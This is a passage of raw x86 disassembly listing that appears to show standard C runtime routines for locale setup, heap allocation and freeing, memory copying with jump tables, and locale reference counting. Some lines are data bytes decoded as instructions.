  425f23:	jne    0x425f34
  425f25:	mov    DWORD PTR ds:0x463884,0x1
  425f2f:	mov    eax,ds:0x4638b4
  425f34:	mov    DWORD PTR [ebp+0x8],eax
  425f37:	cmp    eax,DWORD PTR ds:0x463b24
  425f3d:	je     0x425ffe
  425f43:	mov    esi,DWORD PTR ds:0x463a18
  425f49:	mov    DWORD PTR [ebp-0x20],esi
  425f4c:	cmp    esi,edi
  425f4e:	je     0x425f54
  425f50:	cmp    DWORD PTR [esi],edi
  425f52:	je     0x425f64
  425f54:	push   0x220
  425f59:	call   0x426152
  425f5e:	pop    ecx
  425f5f:	mov    esi,eax
  425f61:	mov    DWORD PTR [ebp-0x20],esi
  425f64:	cmp    esi,edi
  425f66:	je     0x425fe7
  425f68:	push   DWORD PTR [ebp+0x8]
  425f6b:	call   0x425d36
  425f70:	pop    ecx
  425f71:	mov    DWORD PTR [ebp-0x1c],eax
  425f74:	cmp    eax,edi
  425f76:	jne    0x425fe7
  425f78:	mov    DWORD PTR [esi],edi
  425f7a:	mov    eax,ds:0x463b24
  425f7f:	mov    DWORD PTR [esi+0x4],eax
  425f82:	mov    eax,ds:0x463a1c
  425f87:	mov    DWORD PTR [esi+0x8],eax
  425f8a:	mov    eax,ds:0x463a14
  425f8f:	mov    DWORD PTR [esi+0xc],eax
  425f92:	xor    eax,eax
  425f94:	mov    DWORD PTR [ebp-0x24],eax
  425f97:	cmp    eax,0x5
  425f9a:	jge    0x425fac
  425f9c:	mov    cx,WORD PTR [eax*2+0x463b30]
  425fa4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425fa9:	inc    eax
  425faa:	jmp    0x425f94
  425fac:	xor    eax,eax
  425fae:	mov    DWORD PTR [ebp-0x24],eax
  425fb1:	cmp    eax,0x101
  425fb6:	jge    0x425fc5
  425fb8:	mov    cl,BYTE PTR [eax+0x463a20]
  425fbe:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425fc2:	inc    eax
  425fc3:	jmp    0x425fae
  425fc5:	xor    eax,eax
  425fc7:	mov    DWORD PTR [ebp-0x24],eax
  425fca:	cmp    eax,0x100
  425fcf:	jge    0x425fe1
  425fd1:	mov    cl,BYTE PTR [eax+0x463b40]
  425fd7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425fde:	inc    eax
  425fdf:	jmp    0x425fc7
  425fe1:	mov    DWORD PTR ds:0x463a18,esi
  425fe7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425feb:	jne    0x426001
  425fed:	cmp    esi,DWORD PTR ds:0x463a18
  425ff3:	je     0x426001
  425ff5:	push   esi
  425ff6:	call   0x42603a
  425ffb:	pop    ecx
  425ffc:	jmp    0x426001
  425ffe:	mov    DWORD PTR [ebp-0x1c],edi
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x426013
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	call   0x42546f
  426012:	ret    
  426013:	push   0xd
  426015:	call   0x42555b
  42601a:	pop    ecx
  42601b:	ret    
  42601c:	cmp    DWORD PTR ds:0x463d6c,0x0
  426023:	jne    0x426037
  426025:	push   0xfffffffd
  426027:	call   0x425ecc
  42602c:	pop    ecx
  42602d:	mov    DWORD PTR ds:0x463d6c,0x1
  426037:	xor    eax,eax
  426039:	ret    
  42603a:	push   0xc
  42603c:	push   0x4296b8
  426041:	call   0x425434
  426046:	mov    esi,DWORD PTR [ebp+0x8]
  426049:	test   esi,esi
  42604b:	je     0x4260a5
  42604d:	cmp    DWORD PTR ds:0x463c44,0x3
  426054:	jne    0x426096
  426056:	push   0x4
  426058:	call   0x4255ef
  42605d:	pop    ecx
  42605e:	and    DWORD PTR [ebp-0x4],0x0
  426062:	push   esi
  426063:	call   0x426812
  426068:	pop    ecx
  426069:	mov    DWORD PTR [ebp-0x1c],eax
  42606c:	test   eax,eax
  42606e:	je     0x426079
  426070:	push   esi
  426071:	push   eax
  426072:	call   0x42683d
  426077:	pop    ecx
  426078:	pop    ecx
  426079:	or     DWORD PTR [ebp-0x4],0xffffffff
  42607d:	call   0x42608d
  426082:	cmp    DWORD PTR [ebp-0x1c],0x0
  426086:	jne    0x4260a5
  426088:	push   DWORD PTR [ebp+0x8]
  42608b:	jmp    0x426097
  42608d:	push   0x4
  42608f:	call   0x42555b
  426094:	pop    ecx
  426095:	ret    
  426096:	push   esi
  426097:	push   0x0
  426099:	push   DWORD PTR ds:0x463c40
  42609f:	call   DWORD PTR ds:0x429034
  4260a5:	call   0x42546f
  4260aa:	ret    
  4260ab:	push   0xc
  4260ad:	push   0x4296c8
  4260b2:	call   0x425434
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	cmp    DWORD PTR ds:0x463c44,0x3
  4260c1:	jne    0x4260f1
  4260c3:	cmp    esi,DWORD PTR ds:0x463a04
  4260c9:	ja     0x4260f1
  4260cb:	push   0x4
  4260cd:	call   0x4255ef
  4260d2:	pop    ecx
  4260d3:	and    DWORD PTR [ebp-0x4],0x0
  4260d7:	push   esi
  4260d8:	call   0x426ff1
  4260dd:	pop    ecx
  4260de:	mov    DWORD PTR [ebp-0x1c],eax
  4260e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260e5:	call   0x42611d
  4260ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4260ed:	test   eax,eax
  4260ef:	jne    0x426114
  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
